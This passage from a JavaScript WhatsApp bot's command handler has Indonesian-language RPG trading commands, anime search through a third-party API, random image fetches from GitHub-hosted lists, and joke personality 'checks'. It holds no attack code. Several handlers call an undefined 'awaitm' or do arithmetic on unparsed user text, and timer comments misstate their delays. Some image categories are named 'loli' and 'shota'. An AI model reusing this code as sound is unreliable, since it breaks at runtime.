RezzHost.sendMessage(m.chat, {image:{url:bbbb}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${awqu}* batu dan ${usui} kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`} ,{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else {
let seae = await getBuffer(`https://telegra.ph/file/16857796fab2ccb6cffc2.jpg`)
tesk = `*PILIH WILAYAH YANG INGIN KAMU JELAJAHI*


⚪ Corbiens River
🔵 Cochher Sea
⚫ Moobiens Grassland
🟣 Gerbil Woods
🟢 Chiltawa Woods
🟠 Limingstall Mountains
🔴 Chade Mountain

Example :
- ${prefix}jelajah corbiens river
`
RezzHost.sendMessage(m.chat, { image: seae, caption: tesk}, {quoted: m}) 
}
}
break
case 'jualikan':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIkan = 10000
const hasil1 = bayar * hargaIkan
if ( getMancingIkan(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ikan kamu belum cukup, minimal 2 ikan`)
if ( getMancingIkan(m.sender) >= 1 ) {
jualIkan(m.sender, bayar)
users.balance += hasil1
awaitm.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah ikan dijual:* ${bayar}${enter}*Uang didapat:* ${hasil1}${enter}${enter}*Sisa ikan:* ${getMancingIkan(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualcoal':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaCoal = 15000
const hasil2 = bayar * hargaCoal
if ( getMiningcoal(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} kamu tidak punya coal`)
if ( getMiningcoal(m.sender) >= 1 ) {
jualcoal(m.sender, bayar)
users.balance += hasil2
awaitm.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Coal dijual:* ${bayar}${enter}*Uang didapat:* ${hasil2}${enter}${enter}*Sisa coal:* ${getMiningcoal(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'lebur':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaOre = 2
const hasil3 = bayar * hargaOre
if ( getMiningore(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ore kamu belum cukup, minimal 2 ore`)
if ( getMiningore(m.sender) >= 1 ) {
jualore(m.sender, bayar)
addIngot(m.sender, hasil3)
awaitm.reply(`*「 LEBUR BERHASIL 」*\n\n*Jumlah Ore dilebur :* ${bayar}\n*Ingot didapat:* ${hasil3}\n\n*Sisa Ore:* ${getMiningore(m.sender)}`)
}
}
break
case 'jualstone':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaStone = 900
const hasil4 = bayar * hargaStone
if ( getMiningstone(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} stone kamu belum cukup, minimal 2 stone`)
if ( getMiningstone(m.sender) >= 1 ) {
jualstone(m.sender, bayar)
users.balance += hasil4
awaitm.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Batu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil4}${enter}${enter}*Sisa Batu:* ${getMiningstone(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualingot':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaIngot = 35000
const hasil5 = bayar * hargaIngot
if ( getMiningingot(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} ingot kamu belum cukup, minimal 2 ingot`)
if ( getMiningingot(m.sender) >= 1 ) {
jualingot(m.sender, bayar)
users.balance += hasil5
awaitm.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Ingot dijual:* ${bayar}${enter}*Uang didapat:* ${hasil5}${enter}${enter}*Sisa Ingot:* ${getMiningingot(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}`)
}
}
break
case 'jualkayu':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
bayar = args.join(' ')
const hargaKayu = 18000
const hasil6 = bayar * hargaKayu
if ( getNebangKayu(m.sender) <= 1 ) return m.reply(`Maaf ${pushname} kayu kamu belum cukup, minimal 2 kayu`)
if ( getNebangKayu(m.sender) >= 1 ) {
jualkayu(m.sender, bayar)
users.balance += hasil6
awaitm.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah Kayu dijual:* ${bayar}${enter}*Uang didapat:* ${hasil6}${enter}${enter}*Sisa Kayu :* ${await getNebangKayu(m.sender)}${enter}*Sisa uang:* ${await checkATMuser(m.sender)}`)
}
}
break
case 'nebang':{
setTimeout( () => {
const oreo = Math.ceil(Math.random() * 20)
addKayu(m.sender, oreo)
 m.reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${oreo}* kayu selama 2 menit`)
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang menebang, silahkan tunggu...')
}, 0) //1sec
}

break
case 'goplanet':{
setTimeout( () => {
const bertualang = Math.ceil(Math.random() * 100)
const goplanet =['merkurius','venus','mars','jupiter','saturnus','neptunus','uranus']
const planetari = goplanet[Math.floor(Math.random() * goplanet.length)]
addPlanet(m.sender, bertualang)
 m.reply(`*Congratulation 🎊*${enter}${enter}kamu mendapatkan *${bertualang} bahan kimia dari ${planetari}* selama 2 tahun`)
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang meroket 😱, silahkan tunggu... 2 tahun')
}, 0) //1sec
}

break
case 'jualbahankimia':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if(!text) return m.reply(`Kirim perintah ${prefix + command} jumlah yg ingin di jual\n\nContoh ${prefix + command} 10`)
buayar= args.join(" ")
const hargakimia = 1000
const dapetin = buayar * hargakimia
if ( getBertualangPlanet(m.sender) <= 1 ) return m.reply(`maaf ${pushname} kamu tidak punya bahankimia`)
if ( getBertualangPlanet(m.sender) >= 1 ) {
jualbahankimia(m.sender, buayar)
users.balance += dapetin
await m.reply(`*「 PENJUALAN BERHASIL 」*${enter}${enter}*Jumlah bahankimia dijual:* ${buayar}${enter}*Uang didapat:* ${dapetin}${enter}${enter}*Sisa bahankimia:* ${getBertualangPlanet(m.sender)}${enter}*Sisa uang:* ${checkATMuser(m.sender)}${enter}${enter}`)
}
}
break


// BATAS RPG MENU


// ANIME MENU

case 'quotesanime':{
if (!isCreator) return reply(mess.wait)
		let { quotesAnime } = require('./lib/srape/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let ahay = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                }
                RezzHost.sendMessage(m.chat, ahay, { quoted: kalgans })
            }
            break
case 'otakudesu': {
              if (!text) return reply `Example : ${command} black rover`
             reply('Tunggu Ya Kakak, kayy Carikan')
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${apikey}&query=${q}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
              ini_txt += `Judul : ${get_result.judul}\n`
              ini_txt += `Type : ${get_result.type}\n`
              ini_txt += `Episode : ${get_result.episodes}\n`
              ini_txt += `Aired : ${get_result.aired}\n`
              ini_txt += `Producers : ${get_result.producers}\n`
              ini_txt += `Genre : ${get_result.genres}\n`
              ini_txt += `Duration : ${get_result.duration}\n`
              ini_txt += `Studios : ${get_result.status}\n`
              ini_txt += `Rating : ${get_result.rating}\n`
              ini_txt += `Credit : ${get_result.credit}\n`
              get_link = get_result.link_dl
              for (var x in get_link) {
              ini_txt += `\n\n*${get_link[x].title}*\n`
              for (var y in get_link[x].link_dl) {
              ini_info = get_link[x].link_dl[y]
              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
              ini_txt += `\`\`\`Link : \`\`\`\n`
              down_link = ini_info.link_dl
              for (var z in down_link) {
              ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
reply(ini_txt)
}
break
case 'videoanime':
              reply('Tunggu Ya Kak, Kayy Carikan')
              anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${apikey}`)
              RezzHost.sendMessage(m.chat, { video: { url: anu.result }, mimetype: 'video/mp4', caption: `Nih Kak` }, { quoted: kalgans })
              break
case 'akira': case 'akiyama': case 'anachan': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kagachan': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'spacee': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return reply(mess.premium)
reply(mess.search)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/anachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kagachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/spacee/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
RezzHost.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: kalgans })
}
break

// BATAS ANIME MENU



// FUN MENU

case 'nomerhoki':{
                if (!Number(text)) return reply(`Example : ${command} 6281288031294`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return reply(anu.message)
                RezzHost.sendText(m.chat, `≻ *Nomor HP :* ${anu.message.nomer_hp}\n≻ *Angka Shuzi :* ${anu.message.angka_shuzi}\n≻ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n≻ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, kalgans)
            }
            break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(ppuser)
RezzHost.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:kalgans})
break
case 'stupidcheck':
case 'uncleancheck':
case 'hotcheck': 
case 'smartcheck':
case 'greatcheck':
case 'evilcheck':
case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
